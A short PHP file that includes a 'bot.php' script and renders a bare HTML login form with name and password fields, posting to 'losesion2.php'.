<?php
include_once('bot.php');
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
<form action="losesion2.php" method="POST" id="login-form">
    <h2>Login</h2>
    <div class="txtb">
        <label>
            <input class="login-input" type="text" name="name" placeholder="name">
        </label>
    </div>
    <div class="txtb">
        <label>
            <input class="login-input" type="password" name="password" placeholder="password">
        </label>
    </div>
    <input class="login-submit" type="submit" name="submit" value="LOGIN">
</form>
</body>
</html>

